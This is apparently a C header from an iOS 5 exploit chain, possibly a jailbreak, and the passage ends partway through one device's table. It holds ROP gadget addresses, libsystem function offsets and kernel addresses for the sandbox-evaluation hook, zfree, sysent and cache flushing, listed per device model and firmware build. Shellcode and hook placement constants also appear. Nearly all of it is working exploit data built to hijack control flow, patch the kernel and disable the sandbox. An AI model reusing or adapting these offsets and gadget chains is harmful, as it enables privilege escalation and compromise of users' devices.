#include <stdint.h>

// offsets
#define ROP2_ABS_ADDR		0x3eb00000
#define VARS_ABS_ADDR_1		0x3eb20000

// configuration
#define ROP_FILE_NAME		"payload"
#define VARS_FILE_NAME		"payload-vars"
#define VARS_MAX_SIZE		0x1000

// constants
#define	USELESS			0xdeadbeef
#define	PLACE_HOLDER		0xdeadbeef

#define LOG_SHIFT (16 + STRLEN_PID + constants->STRLEN_FILENAME)
#define P3_ADDR_LO (constants->P2_ADDR_LO + ((constants->P3 - constants->P2) * 4))

#define SHELLCODE_ADDR 0x80000400
#define ZFREEHOOK_ADDR (offsets->ZFREE - 1)
#define ZFREEHOOKER_ADDR 0x80000600

#define SB_EVALUATEHOOK_ADDR (offsets->SB_EVALUATE - 1)
#define SB_EVALUATEHOOKER_ADDR 0x80000700

struct constants
{
    unsigned int STRLEN_FILENAME;
    unsigned int P1;
    unsigned int P2;
    unsigned int P3;
    unsigned int P2_ADDR_LO;
    unsigned int LR_ADDR_LO;
};

struct offsets
{
    // libsystem_kernel.dylib
    uint32_t _dsc_open;
    uint32_t _dsc_fstat;
    uint32_t _dsc_chown;
    uint32_t _dsc_chmod;
    uint32_t _dsc_memcpy;
    uint32_t _dsc_munmap;
    uint32_t _dsc_unlink;
    uint32_t _dsc_mkdir;
    uint32_t _dsc_ftruncate;
    uint32_t _dsc_ioctl;
    uint32_t _dsc_close;
    uint32_t _dsc_ptrace;
    uint32_t _dsc_bsdthread_terminate;
    uint32_t _dsc_shm_open;
    uint32_t _dsc_mmap;
    uint32_t _dsc_mach_task_self;
    uint32_t _dsc_mach_port_allocate;
    uint32_t _dsc_mach_port_insert_right;
    uint32_t _dsc_mach_msg;
    uint32_t _dsc_mount;
    uint32_t _dsc_unmount;
    uint32_t _dsc_syscall;
    uint32_t _dsc_psynch_rw_unlock;

    // libsystem_c.dylib
    uint32_t _dsc_fopen;
    uint32_t _dsc_fread;
    uint32_t _dsc_fclose;
    uint32_t _dsc_exit;
    uint32_t _dsc_syslog;
    uint32_t _dsc_sysctl;
    uint32_t _dsc_malloc;
    uint32_t _dsc_memmem;
    uint32_t _dsc_sleep;
    uint32_t _dsc_proc_pidinfo;
    uint32_t _dsc_execl;
    uint32_t _dsc_strcpy;
    uint32_t _dsc_sys_dcache_flush;

    uint32_t LIBC_POP_R0;
    // __aeabi_cfcmpeq+0x10
    uint32_t LIBC_POP_R0123;
    uint32_t LIBC_POP_R47;
    uint32_t LIBC_BLX_R4_POP_R47;
    uint32_t LIBC_MOV_SP_R4__POP_R47;
    uint32_t LIBC_STR_R0_R4__POP_R47;
    uint32_t LIBC_LDR_R0_R0__POP_R7;
    uint32_t LIBC_SUB_R0_R4__POP_R4567;
    // pthread_mutex_lock+0x1B6
    uint32_t GADGET_MOV_SP_R4_POP8_10_11_4567;

    // libicucore.A.dylib
    // uloc_toLanguageTag+0x24B2
    uint32_t GADGET_ADD_SP_120_POP8_10_4567;

    // libxml2.dylib
    // xmlRegisterInputCallbacks+0x36
    uint32_t GADGET_MOV_LR_R4_MOV_R0_LR_POP47;

    // liblaunch.dylib
    uint32_t _dsc_bootstrap_look_up;

    // libdyld.dylib
    uint32_t _dsc_dlsym;

    // libxpc.dylib
    uint32_t LIBC_BLX_R4_POP_R457;

    // /System/Library/Frameworks/CoreData.framework/CoreData
    uint32_t GADGET_SUBS_R0_R0_R1__POP7;

    // /System/Library/Frameworks/AudioToolbox.framework/AudioToolbox
    uint32_t GADGET_MOV_R1_R0__POP_R47;

    // /System/Library/Frameworks/AddressBook.framework/AddressBook
    uint32_t GADGET_MOV_R0_R1__POP_R47;
    uint32_t GADGET_MOV_R0_R4__POP_R47;

    // /System/Library/PrivateFrameworks/JavaScriptCore.framework/JavaScriptCore
    uint32_t GADGET_MOV_R1_R4__POP_R47;

    // /System/Library/PrivateFrameworks/DataDetectorsCore.framework/DataDetectorsCore
    uint32_t GADGET_ADD_R0_R0_R1__POP457;

    // /System/Library/PrivateFrameworks/VideoToolbox.framework/VideoToolbox
    // vt_Copy_420f_420v_arm+0x220
    // 35982100        e28dd008        add     sp, sp, #8      @ 0x8
    // 35982104        ecbd8b08        vldmia  sp!, {d8-d11}
    // 35982108        ecbdcb08        vldmia  sp!, {d12-d15}
    // 3598210c        e8bd0d00        pop     {r8, sl, fp}
    // 35982110        e8bd80f0        pop     {r4, r5, r6, r7, pc}
    uint32_t GADGET_HOLY;

    uint32_t ZFREE;
    uint32_t SYSENT;
    uint32_t FLUSH_DCACHE_ALL;
    uint32_t INVALIDATE_ICACHE_ALL;
    uint32_t SB_EVALUATE;
};

enum
{
    iPad1_1,
    iPhone2_1,
    iPhone3_1,
    iPhone3_3,
    iPhone4_1,
    iPad2_1,
    iPad2_2,
    iPad2_3,
    iPod3_1,
    iPod4_1,
    MAX_DEVICE
};

enum
{
    FW9A334,
    FW9A405,
    FW9A406,
    MAX_FIRMWARE
};

const char* devices[MAX_DEVICE] =
{
    [iPad1_1] = "iPad1,1",
    [iPhone2_1] = "iPhone2,1",
    [iPhone3_1] = "iPhone3,1",
    [iPhone3_3] = "iPhone3,3",
    [iPhone4_1] = "iPhone4,1",
    [iPad2_1] = "iPad2,1",
    [iPad2_2] = "iPad2,2",
    [iPad2_3] = "iPad2,3",
    [iPod3_1] = "iPod3,1",
    [iPod4_1] = "iPod4,1",
};

const char* firmwares[MAX_FIRMWARE] =
{
    [FW9A334] = "9A334",
    [FW9A405] = "9A405",
    [FW9A406] = "9A406"
};


struct constants constants_bootstrap_iPad1_1_9A334 =
{
    .STRLEN_FILENAME = 29,

    .P1 = 402,
    .P2 = 619,
    .P3 = 625,
    //   p2 address: 0xXXXXXX[0c]
    .P2_ADDR_LO = 0x0c,
    .LR_ADDR_LO = 0x10,
};

struct constants constants_iPad1_1_9A334 =
{
    .STRLEN_FILENAME = 66,

    .P1 = 402,
    .P2 = 619,
    .P3 = 625,
    //   p2 address: 0xXXXXXX[2c]
    .P2_ADDR_LO = 0x2c,
    .LR_ADDR_LO = 0x30,
};

struct offsets offsets_iPad1_1_9A334 =
{
    // libsystem_kernel.dylib
    ._dsc_open = 0x3573ddc4,
    ._dsc_fstat = 0x3572e6f4,
    ._dsc_chown = 0x35730518,
    ._dsc_chmod = (0x3572fae0 + 1),
    ._dsc_memcpy = (0x3572e98c + 1),
    ._dsc_munmap = 0x3573dd68,
    ._dsc_unlink = (0x3572feb4 + 1),
    ._dsc_mkdir = 0x35730c34,
    ._dsc_ftruncate = 0x35730ca0,
    ._dsc_ioctl = (0x3572fbf8 + 1),
    ._dsc_close = 0x3572e71c,
    ._dsc_ptrace = 0x3573e394,
    ._dsc_bsdthread_terminate = 0x3573d228,
    ._dsc_shm_open = 0x357304a8,
    ._dsc_mmap = (0x3572e658 + 1),
    ._dsc_mach_task_self = (0x3573cd88 + 1),
    ._dsc_mach_port_allocate = (0x3572ee44 + 1),
    ._dsc_mach_port_insert_right = (0x3572ee70 + 1),
    ._dsc_mach_msg = (0x3572e1d4 + 1),
    ._dsc_mount = 0x3573f6e4,
    ._dsc_unmount = 0x35740040,
    ._dsc_syscall = 0x3573eafc,
    ._dsc_psynch_rw_unlock = 0x3573e1a0,

    // libsystem_c.dylib
    ._dsc_fopen = (0x35757004 + 1),
    ._dsc_fread = (0x3575d814 + 1),
    ._dsc_fclose = (0x3575765c + 1),
    ._dsc_exit = (0x357599d0 + 1),
    ._dsc_syslog = (0x35751ad0 + 1),
    ._dsc_sysctl = (0x3574ec64 + 1),
    ._dsc_malloc = (0x3574e184 + 1),
    ._dsc_memmem = (0x35767cf0 + 1),
    ._dsc_sleep = (0x35765a54 + 1),
    ._dsc_proc_pidinfo = (0x357564e0 + 1),
    ._dsc_execl = (0x35779cac + 1),
    ._dsc_strcpy = 0x35753d30,
    ._dsc_sys_dcache_flush = 0x3575f80c,

    // __aeabi_cdcmpeq+0x10
    .LIBC_POP_R0 = 0x357be340,
    // __aeabi_cfcmpeq+0x10
    .LIBC_POP_R0123 = 0x357beb10,
    // wctomb_l+0x4A
    .LIBC_POP_R47 = (0x35771f3e + 1),
    // wctomb_l+0x44
    .LIBC_BLX_R4_POP_R47 = (0x35771f38 + 1),
    // lockf$NOCANCEL+0x98
    .LIBC_MOV_SP_R4__POP_R47 = (0x35777cd8 + 1),
    // filesec_discard_aclbuf+0x26 
    .LIBC_STR_R0_R4__POP_R47 = (0x3578b49a + 1),
    // malloc_default_zone+0x24
    .LIBC_LDR_R0_R0__POP_R7 = (0x357514b4 + 1),
    // strvis+0x32
    .LIBC_SUB_R0_R4__POP_R4567 = (0x35776246 + 1),
    // pthread_mutex_lock+0x1B6
    .GADGET_MOV_SP_R4_POP8_10_11_4567 = (0x35749c82 + 1),

    // libicucore.A.dylib
    // uloc_toLanguageTag+0x24B2
    .GADGET_ADD_SP_120_POP8_10_4567 = (0x34cbfe2e + 1),

    // libxml2.dylib
    // xmlRegisterInputCallbacks+0x36
    .GADGET_MOV_LR_R4_MOV_R0_LR_POP47 = (0x36f8001a + 1),

    // liblaunch.dylib
    ._dsc_bootstrap_look_up = (0x36695fe8 + 1),

    // libdyld.dylib
    ._dsc_dlsym = (0x30ea06ec + 1),

    // libxpc.dylib
    // ___create_with_format_and_arguments_block_invoke_4+0x2c
    .LIBC_BLX_R4_POP_R457 = (0x3198539c + 1),

    // /System/Library/Frameworks/CoreData.framework/CoreData
    // _PF_SnowLeopard_CFBasicHashFold+0x78
    .GADGET_SUBS_R0_R0_R1__POP7 = (0x358fd748 + 1),

    // /System/Library/Frameworks/AudioToolbox.framework/AudioToolbox
    // _ZN10NUMovieBox14GetTotalFramesEPS_+0xC
    .GADGET_MOV_R1_R0__POP_R47 = (0x32a4d9cc + 1),

    // /System/Library/Frameworks/AddressBook.framework/AddressBook
    // _ABCGetISOCountryCodeFromAddressFormatPlistCountryCode+0x66
    .GADGET_MOV_R0_R1__POP_R47 = (0x306c828a + 1),
    // ABCMultiValueCopyLabelAtIndex+0x28
    .GADGET_MOV_R0_R4__POP_R47 = (0x306cbd78 + 1),

    // /System/Library/PrivateFrameworks/JavaScriptCore.framework/JavaScriptCore
    // _ZN3JSCL20dateProtoFuncGetTimeEPNS_9ExecStateE+0x54
    .GADGET_MOV_R1_R4__POP_R47 = (0x345ad0ec + 1),

    // /System/Library/PrivateFrameworks/DataDetectorsCore.framework/DataDetectorsCore
    // DDScannerGetMemoryUsed+0x28
    .GADGET_ADD_R0_R0_R1__POP457 = 0x34c56ae8,

    // /System/Library/PrivateFrameworks/VideoToolbox.framework/VideoToolbox
    // vt_Copy_420f_420v_arm+0x220
    // 35982100        e28dd008        add     sp, sp, #8      @ 0x8
    // 35982104        ecbd8b08        vldmia  sp!, {d8-d11}
    // 35982108        ecbdcb08        vldmia  sp!, {d12-d15}
    // 3598210c        e8bd0d00        pop     {r8, sl, fp}
    // 35982110        e8bd80f0        pop     {r4, r5, r6, r7, pc}
    .GADGET_HOLY = 0x31b96100,

    .ZFREE = (0x8002f3d0 + 1),
    .SYSENT = 0x802ccbac,
    .FLUSH_DCACHE_ALL = 0x80071b0c,
    .INVALIDATE_ICACHE_ALL = 0x800719c4,
    .SB_EVALUATE = (0x806030ec + 1)
};


struct constants constants_bootstrap_iPad1_1 =
{
    .STRLEN_FILENAME = 29,

    .P1 = 402,
    .P2 = 619,
    .P3 = 625,
    //   p2 address: 0xXXXXXX[0c]
    .P2_ADDR_LO = 0x0c,
    .LR_ADDR_LO = 0x10,
};

struct constants constants_iPad1_1 =
{
    .STRLEN_FILENAME = 66,

    .P1 = 402,
    .P2 = 619,
    .P3 = 625,
    //   p2 address: 0xXXXXXX[2c]
    .P2_ADDR_LO = 0x2c,
    .LR_ADDR_LO = 0x30,
};

struct offsets offsets_iPad1_1 =
{
    // libsystem_kernel.dylib
    ._dsc_open = 0x35f66dc4,
    ._dsc_fstat = 0x35f576f4,
    ._dsc_chown = 0x35f59518,
    ._dsc_chmod = (0x35f58ae0 + 1),
    ._dsc_memcpy = (0x35f5798c + 1),
    ._dsc_munmap = 0x35f66d68,
    ._dsc_unlink = (0x35f58eb4 + 1),
    ._dsc_mkdir = 0x35f59c34,
    ._dsc_ftruncate = 0x35f59ca0,
    ._dsc_ioctl = (0x35f58bf8 + 1),
    ._dsc_close = 0x35f5771c,
    ._dsc_ptrace = 0x35f67394,
    ._dsc_bsdthread_terminate = 0x35f66228,
    ._dsc_shm_open = 0x35f594a8,
    ._dsc_mmap = (0x35f57658 + 1),
    ._dsc_mach_task_self = (0x35f65d88 + 1),
    ._dsc_mach_port_allocate = (0x35f57e44 + 1),
    ._dsc_mach_port_insert_right = (0x35f57e70 + 1),
    ._dsc_mach_msg = (0x35f571d4 + 1),
    ._dsc_mount = 0x35f686e4,
    ._dsc_unmount = 0x35f69040,
    ._dsc_syscall = 0x35f67afc,
    ._dsc_psynch_rw_unlock = 0x35f671a0,

    // libsystem_c.dylib
    ._dsc_fopen = (0x347d6004 + 1),
    ._dsc_fread = (0x347dc814 + 1),
    ._dsc_fclose = (0x347d665c + 1),
    ._dsc_exit = (0x347d89d0 + 1),
    ._dsc_syslog = (0x347d0ad0 + 1),
    ._dsc_sysctl = (0x347cdc64 + 1),
    ._dsc_malloc = (0x347cd184 + 1),
    ._dsc_memmem = (0x347e6cf0 + 1),
    ._dsc_sleep = (0x347e4a54 + 1),
    ._dsc_proc_pidinfo = (0x347d54e0 + 1),
    ._dsc_execl = (0x347f8cac + 1),
    ._dsc_strcpy = 0x347d2d30,
    ._dsc_sys_dcache_flush = 0x347de80c,

    // __aeabi_cdcmpeq+0x10
    .LIBC_POP_R0 = 0x3483d340,
    // __aeabi_cfcmpeq+0x10
    .LIBC_POP_R0123 = 0x3483db10,
    // wctomb_l+0x4A
    .LIBC_POP_R47 = (0x347f0f3e + 1),
    // wctomb_l+0x44
    .LIBC_BLX_R4_POP_R47 = (0x347f0f38 + 1),
    // lockf$NOCANCEL+0x98
    .LIBC_MOV_SP_R4__POP_R47 = (0x347f6cd8 + 1),
    // filesec_discard_aclbuf+0x26 
    .LIBC_STR_R0_R4__POP_R47 = (0x3480a49a + 1),
    // malloc_default_zone+0x24
    .LIBC_LDR_R0_R0__POP_R7 = (0x347d04b4 + 1),
    // strvis+0x32
    .LIBC_SUB_R0_R4__POP_R4567 = (0x347f5246 + 1),
    // pthread_mutex_lock+0x1B6
    .GADGET_MOV_SP_R4_POP8_10_11_4567 = (0x347c8c82 + 1),

    // libicucore.A.dylib
    // uloc_toLanguageTag+0x24B2
    .GADGET_ADD_SP_120_POP8_10_4567 = (0x3707be2e + 1),

    // libxml2.dylib
    // xmlRegisterInputCallbacks+0x36
    .GADGET_MOV_LR_R4_MOV_R0_LR_POP47 = (0x36ee601a + 1),

    // liblaunch.dylib
    ._dsc_bootstrap_look_up = (0x37421fe8 + 1),

    // libdyld.dylib
    ._dsc_dlsym = (0x351dc6ec + 1),

    // libxpc.dylib
    // ___create_with_format_and_arguments_block_invoke_4+0x2c
    .LIBC_BLX_R4_POP_R457 = (0x3518639c + 1),

    // /System/Library/Frameworks/CoreData.framework/CoreData
    // _PF_SnowLeopard_CFBasicHashFold+0x78
    .GADGET_SUBS_R0_R0_R1__POP7 = (0x333c1748 + 1),

    // /System/Library/Frameworks/AudioToolbox.framework/AudioToolbox
    // _ZN10NUMovieBox14GetTotalFramesEPS_+0xC
    .GADGET_MOV_R1_R0__POP_R47 = (0x357a39cc + 1),

    // /System/Library/Frameworks/AddressBook.framework/AddressBook
    // _ABCGetISOCountryCodeFromAddressFormatPlistCountryCode+0x66
    .GADGET_MOV_R0_R1__POP_R47 = (0x37bba26e + 1),
    // ABCMultiValueCopyLabelAtIndex+0x28
    .GADGET_MOV_R0_R4__POP_R47 = (0x37bbdd5c + 1),

    // /System/Library/PrivateFrameworks/JavaScriptCore.framework/JavaScriptCore
    // _ZN3JSCL20dateProtoFuncGetTimeEPNS_9ExecStateE+0x54
    .GADGET_MOV_R1_R4__POP_R47 = (0x349220ec + 1),

    // /System/Library/PrivateFrameworks/DataDetectorsCore.framework/DataDetectorsCore
    // DDScannerGetMemoryUsed+0x28
    .GADGET_ADD_R0_R0_R1__POP457 = 0x31567ae8,

    // /System/Library/PrivateFrameworks/VideoToolbox.framework/VideoToolbox
    // vt_Copy_420f_420v_arm+0x220
    // 35982100        e28dd008        add     sp, sp, #8      @ 0x8
    // 35982104        ecbd8b08        vldmia  sp!, {d8-d11}
    // 35982108        ecbdcb08        vldmia  sp!, {d12-d15}
    // 3598210c        e8bd0d00        pop     {r8, sl, fp}
    // 35982110        e8bd80f0        pop     {r4, r5, r6, r7, pc}
    .GADGET_HOLY = 0x34f66100,

    .ZFREE = (0x8002f3d0 + 1),
    .SYSENT = 0x802ccbac,
    .FLUSH_DCACHE_ALL = 0x80071b0c,
    .INVALIDATE_ICACHE_ALL = 0x800719c4,
    .SB_EVALUATE = (0x806030ec + 1)
};


struct constants constants_bootstrap_iPhone2_1_9A334 =
{
    .STRLEN_FILENAME = 29,

    .P1 = 402,
    .P2 = 619,
    .P3 = 625,
    //   p2 address: 0xXXXXXX[0c]
    .P2_ADDR_LO = 0x0c,
    .LR_ADDR_LO = 0x10,
};

struct constants constants_iPhone2_1_9A334 =
{
    .STRLEN_FILENAME = 66,

    .P1 = 402,
    .P2 = 619,
    .P3 = 625,
    //   p2 address: 0xXXXXXX[2c]
    .P2_ADDR_LO = 0x2c,
    .LR_ADDR_LO = 0x30,
};

struct offsets offsets_iPhone2_1_9A334 =
{
    // libsystem_kernel.dylib
    ._dsc_open = 0x30cc9dc4,
    ._dsc_fstat = 0x30cba6f4,
    ._dsc_chown = 0x30cbc518,
    ._dsc_chmod = (0x30cbbae0 + 1),
    ._dsc_memcpy = (0x30cba98c + 1),
    ._dsc_munmap = 0x30cc9d68,
    ._dsc_unlink = (0x30cbbeb4 + 1),
    ._dsc_mkdir = 0x30cbcc34,
    ._dsc_ftruncate = 0x30cbcca0,
    ._dsc_ioctl = (0x30cbbbf8 + 1),
    ._dsc_close = 0x30cba71c,
    ._dsc_ptrace = 0x30cca394,
    ._dsc_bsdthread_terminate = 0x30cc9228,
    ._dsc_shm_open = 0x30cbc4a8,
    ._dsc_mmap = (0x30cba658 + 1),
    ._dsc_mach_task_self = (0x30cc8d88 + 1),
    ._dsc_mach_port_allocate = (0x30cbae44 + 1),
    ._dsc_mach_port_insert_right = (0x30cbae70 + 1),
    ._dsc_mach_msg = (0x30cba1d4 + 1),
    ._dsc_mount = 0x30ccb6e4,
    ._dsc_unmount = 0x30ccc040,
    ._dsc_syscall = 0x30ccaafc,
    ._dsc_psynch_rw_unlock = 0x30cca1a0,

    // libsystem_c.dylib
    ._dsc_fopen = (0x33770004 + 1),
    ._dsc_fread = (0x33776814 + 1),
    ._dsc_fclose = (0x3377065c + 1),
    ._dsc_exit = (0x337729d0 + 1),
    ._dsc_syslog = (0x3376aad0 + 1),
    ._dsc_sysctl = (0x33767c64 + 1),
    ._dsc_malloc = (0x33767184 + 1),
    ._dsc_memmem = (0x33780cf0 + 1),
    ._dsc_sleep = (0x3377ea54 + 1),
    ._dsc_proc_pidinfo = (0x3376f4e0 + 1),
    ._dsc_execl = (0x33792cac + 1),
    ._dsc_strcpy = 0x3376cd30,
    ._dsc_sys_dcache_flush = 0x3377880c,

    // __aeabi_cdcmpeq+0x10
    .LIBC_POP_R0 = 0x337d7340,
    // __aeabi_cfcmpeq+0x10
    .LIBC_POP_R0123 = 0x337d7b10,
    // wctomb_l+0x4A
    .LIBC_POP_R47 = (0x3378af3e + 1),
    // wctomb_l+0x44
    .LIBC_BLX_R4_POP_R47 = (0x3378af38 + 1),
    // lockf$NOCANCEL+0x98
    .LIBC_MOV_SP_R4__POP_R47 = (0x33790cd8 + 1),
    // filesec_discard_aclbuf+0x26 
    .LIBC_STR_R0_R4__POP_R47 = (0x337a449a + 1),
    // malloc_default_zone+0x24
    .LIBC_LDR_R0_R0__POP_R7 = (0x3376a4b4 + 1),
    // strvis+0x32
    .LIBC_SUB_R0_R4__POP_R4567 = (0x3378f246 + 1),
    // pthread_mutex_lock+0x1B6
    .GADGET_MOV_SP_R4_POP8_10_11_4567 = (0x33762c82 + 1),

    // libicucore.A.dylib
    // uloc_toLanguageTag+0x24B2
    .GADGET_ADD_SP_120_POP8_10_4567 = (0x37a00e2e + 1),

    // libxml2.dylib
    // xmlRegisterInputCallbacks+0x36
    .GADGET_MOV_LR_R4_MOV_R0_LR_POP47 = (0x362b701a + 1),

    // liblaunch.dylib
    ._dsc_bootstrap_look_up = (0x35d68fe8 + 1),

    // libdyld.dylib
    ._dsc_dlsym = (0x356dc6ec + 1),

    // libxpc.dylib
    // ___create_with_format_and_arguments_block_invoke_4+0x2c
    .LIBC_BLX_R4_POP_R457 = (0x36eaf39c + 1),

    // /System/Library/Frameworks/CoreData.framework/CoreData
    // _PF_SnowLeopard_CFBasicHashFold+0x78
    .GADGET_SUBS_R0_R0_R1__POP7 = (0x36fc5748 + 1),

    // /System/Library/Frameworks/AudioToolbox.framework/AudioToolbox
    // _ZN10NUMovieBox14GetTotalFramesEPS_+0xC
    .GADGET_MOV_R1_R0__POP_R47 = (0x31a209cc + 1),

    // /System/Library/Frameworks/AddressBook.framework/AddressBook
    // _ABCGetISOCountryCodeFromAddressFormatPlistCountryCode+0x66
    .GADGET_MOV_R0_R1__POP_R47 = (0x3663228a + 1),
    // ABCMultiValueCopyLabelAtIndex+0x28
    .GADGET_MOV_R0_R4__POP_R47 = (0x36635d78 + 1),

    // /System/Library/PrivateFrameworks/JavaScriptCore.framework/JavaScriptCore
    // _ZN3JSCL20dateProtoFuncGetTimeEPNS_9ExecStateE+0x54
    .GADGET_MOV_R1_R4__POP_R47 = (0x32b0e0ec + 1),

    // /System/Library/PrivateFrameworks/DataDetectorsCore.framework/DataDetectorsCore
    // DDScannerGetMemoryUsed+0x28
    .GADGET_ADD_R0_R0_R1__POP457 = 0x3002aae8,

    // /System/Library/PrivateFrameworks/VideoToolbox.framework/VideoToolbox
    // vt_Copy_420f_420v_arm+0x220
    // 35982100        e28dd008        add     sp, sp, #8      @ 0x8
    // 35982104        ecbd8b08        vldmia  sp!, {d8-d11}
    // 35982108        ecbdcb08        vldmia  sp!, {d12-d15}
    // 3598210c        e8bd0d00        pop     {r8, sl, fp}
    // 35982110        e8bd80f0        pop     {r4, r5, r6, r7, pc}
    .GADGET_HOLY = 0x36469100,

    .ZFREE = (0x8002f3d0 + 1),
    .SYSENT = 0x802ccbac,
    .FLUSH_DCACHE_ALL = 0x80071198,
    .INVALIDATE_ICACHE_ALL = 0x80071b88,
    .SB_EVALUATE = (0x805780ec + 1)
};


struct constants constants_bootstrap_iPhone2_1 =
{
    .STRLEN_FILENAME = 29,

    .P1 = 402,
    .P2 = 619,
    .P3 = 625,
    //   p2 address: 0xXXXXXX[0c]
    .P2_ADDR_LO = 0x0c,
    .LR_ADDR_LO = 0x10,
};

struct constants constants_iPhone2_1 =
{
    .STRLEN_FILENAME = 66,

    .P1 = 402,
    .P2 = 619,
    .P3 = 625,
    //   p2 address: 0xXXXXXX[2c]
    .P2_ADDR_LO = 0x2c,
    .LR_ADDR_LO = 0x30,
};

struct offsets offsets_iPhone2_1 =
{
    // libsystem_kernel.dylib
    ._dsc_open = 0x36e19dc4,
    ._dsc_fstat = 0x36e0a6f4,
    ._dsc_chown = 0x36e0c518,
    ._dsc_chmod = (0x36e0bae0 + 1),
    ._dsc_memcpy = (0x36e0a98c + 1),
    ._dsc_munmap = 0x36e19d68,
    ._dsc_unlink = (0x36e0beb4 + 1),
    ._dsc_mkdir = 0x36e0cc34,
    ._dsc_ftruncate = 0x36e0cca0,
    ._dsc_ioctl = (0x36e0bbf8 + 1),
    ._dsc_close = 0x36e0a71c,
    ._dsc_ptrace = 0x36e1a394,
    ._dsc_bsdthread_terminate = 0x36e19228,
    ._dsc_shm_open = 0x36e0c4a8,
    ._dsc_mmap = (0x36e0a658 + 1),
    ._dsc_mach_task_self = (0x36e18d88 + 1),
    ._dsc_mach_port_allocate = (0x36e0ae44 + 1),
    ._dsc_mach_port_insert_right = (0x36e0ae70 + 1),
    ._dsc_mach_msg = (0x36e0a1d4 + 1),
    ._dsc_mount = 0x36e1b6e4,
    ._dsc_unmount = 0x36e1c040,
    ._dsc_syscall = 0x36e1aafc,
    ._dsc_psynch_rw_unlock = 0x36e1a1a0,

    // libsystem_c.dylib
    ._dsc_fopen = (0x35cf4004 + 1),
    ._dsc_fread = (0x35cfa814 + 1),
    ._dsc_fclose = (0x35cf465c + 1),
    ._dsc_exit = (0x35cf69d0 + 1),
    ._dsc_syslog = (0x35ceead0 + 1),
    ._dsc_sysctl = (0x35cebc64 + 1),
    ._dsc_malloc = (0x35ceb184 + 1),
    ._dsc_memmem = (0x35d04cf0 + 1),
    ._dsc_sleep = (0x35d02a54 + 1),
    ._dsc_proc_pidinfo = (0x35cf34e0 + 1),
    ._dsc_execl = (0x35d16cac + 1),
    ._dsc_strcpy = 0x35cf0d30,
    ._dsc_sys_dcache_flush = 0x35cfc80c,

    // __aeabi_cdcmpeq+0x10
    .LIBC_POP_R0 = 0x35d5b340,
    // __aeabi_cfcmpeq+0x10
    .LIBC_POP_R0123 = 0x35d5bb10,
    // wctomb_l+0x4A
    .LIBC_POP_R47 = (0x35d0ef3e + 1),
    // wctomb_l+0x44
    .LIBC_BLX_R4_POP_R47 = (0x35d0ef38 + 1),
    // lockf$NOCANCEL+0x98
    .LIBC_MOV_SP_R4__POP_R47 = (0x35d14cd8 + 1),
    // filesec_discard_aclbuf+0x26 
    .LIBC_STR_R0_R4__POP_R47 = (0x35d2849a + 1),
    // malloc_default_zone+0x24
    .LIBC_LDR_R0_R0__POP_R7 = (0x35cee4b4 + 1),
    // strvis+0x32
    .LIBC_SUB_R0_R4__POP_R4567 = (0x35d13246 + 1),
    // pthread_mutex_lock+0x1B6
    .GADGET_MOV_SP_R4_POP8_10_11_4567 = (0x35ce6c82 + 1),

    // libicucore.A.dylib
    // uloc_toLanguageTag+0x24B2
    .GADGET_ADD_SP_120_POP8_10_4567 = (0x34d75e2e + 1),

    // libxml2.dylib
    // xmlRegisterInputCallbacks+0x36
    .GADGET_MOV_LR_R4_MOV_R0_LR_POP47 = (0x314b301a + 1),

    // liblaunch.dylib
    ._dsc_bootstrap_look_up = (0x35c92fe8 + 1),

    // libdyld.dylib
    ._dsc_dlsym = (0x34a186ec + 1),

    // libxpc.dylib
    // ___create_with_format_and_arguments_block_invoke_4+0x2c
    .LIBC_BLX_R4_POP_R457 = (0x315b339c + 1),

    // /System/Library/Frameworks/CoreData.framework/CoreData
    // _PF_SnowLeopard_CFBasicHashFold+0x78
    .GADGET_SUBS_R0_R0_R1__POP7 = (0x356ef748 + 1),

    // /System/Library/Frameworks/AudioToolbox.framework/AudioToolbox
    // _ZN10NUMovieBox14GetTotalFramesEPS_+0xC
    .GADGET_MOV_R1_R0__POP_R47 = (0x35b3a9cc + 1),

    // /System/Library/Frameworks/AddressBook.framework/AddressBook
    // _ABCGetISOCountryCodeFromAddressFormatPlistCountryCode+0x66
    .GADGET_MOV_R0_R1__POP_R47 = (0x34a5a26e + 1),
    // ABCMultiValueCopyLabelAtIndex+0x28
    .GADGET_MOV_R0_R4__POP_R47 = (0x34a5dd5c + 1),

    // /System/Library/PrivateFrameworks/JavaScriptCore.framework/JavaScriptCore
    // _ZN3JSCL20dateProtoFuncGetTimeEPNS_9ExecStateE+0x54
    .GADGET_MOV_R1_R4__POP_R47 = (0x316110ec + 1),

    // /System/Library/PrivateFrameworks/DataDetectorsCore.framework/DataDetectorsCore
    // DDScannerGetMemoryUsed+0x28
    .GADGET_ADD_R0_R0_R1__POP457 = 0x3105dae8,

    // /System/Library/PrivateFrameworks/VideoToolbox.framework/VideoToolbox
    // vt_Copy_420f_420v_arm+0x220
    // 35982100        e28dd008        add     sp, sp, #8      @ 0x8
    // 35982104        ecbd8b08        vldmia  sp!, {d8-d11}
    // 35982108        ecbdcb08        vldmia  sp!, {d12-d15}
    // 3598210c        e8bd0d00        pop     {r8, sl, fp}
    // 35982110        e8bd80f0        pop     {r4, r5, r6, r7, pc}
    .GADGET_HOLY = 0x3319a100,

    .ZFREE = (0x8002f3d0 + 1),
    .SYSENT = 0x802ccbac,
    .FLUSH_DCACHE_ALL = 0x80071b0c,
    .INVALIDATE_ICACHE_ALL = 0x800719c4,
    .SB_EVALUATE = (0x805780ec + 1)
};


struct constants constants_bootstrap_iPhone3_1_9A334 =
{
    .STRLEN_FILENAME = 29,

    .P1 = 402,
    .P2 = 619,
    .P3 = 625,
    //   p2 address: 0xXXXXXX[0c]
    .P2_ADDR_LO = 0x0c,
    .LR_ADDR_LO = 0x10,
};

struct constants constants_iPhone3_1_9A334 =
{
    .STRLEN_FILENAME = 66,

    .P1 = 402,
    .P2 = 619,
    .P3 = 625,
    //   p2 address: 0xXXXXXX[2c]
    .P2_ADDR_LO = 0x2c,
    .LR_ADDR_LO = 0x30,
};

struct offsets offsets_iPhone3_1_9A334 =
{
    // libsystem_kernel.dylib
    ._dsc_open = 0x31d5ddc4,
    ._dsc_fstat = 0x31d4e6f4,
    ._dsc_chown = 0x31d50518,
    ._dsc_chmod = (0x31d4fae0 + 1),
    ._dsc_memcpy = (0x31d4e98c + 1),
    ._dsc_munmap = 0x31d5dd68,
    ._dsc_unlink = (0x31d4feb4 + 1),
    ._dsc_mkdir = 0x31d50c34,
    ._dsc_ftruncate = 0x31d50ca0,
    ._dsc_ioctl = (0x31d4fbf8 + 1),
    ._dsc_close = 0x31d4e71c,
    ._dsc_ptrace = 0x31d5e394,
    ._dsc_bsdthread_terminate = 0x31d5d228,
    ._dsc_shm_open = 0x31d504a8,
